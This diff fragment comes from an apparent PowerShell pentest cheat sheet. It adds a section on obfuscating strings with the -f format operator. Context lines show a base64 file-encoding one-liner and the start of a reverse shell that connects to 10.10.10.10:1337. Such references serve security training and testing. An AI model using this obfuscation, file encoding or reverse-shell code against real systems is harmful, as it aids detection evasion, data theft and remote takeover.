@@ -294,6 +294,13 @@ Get-ChildItem -Path cert:\LocalMachine
 powershell -c [convert]::ToBase64String((cat $file -Encoding byte)) 
 ```
 
+## Formatting
+Powershell formating leads to obsucation with [-f Format operator](https://ss64.com/ps/syntax-f-operator.html)
+```powershell
+${string} = ("{9}{8}{7}{6}{5}{4}{3}{2}{1}{0}"-f'Power','shell',' Formatting',' is',' obfuscation',' through',' ordering',' of',' parametres and splitting','strings')
+echo $string 
+```
+
 ## Powershell Reverse Shell
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 1337);
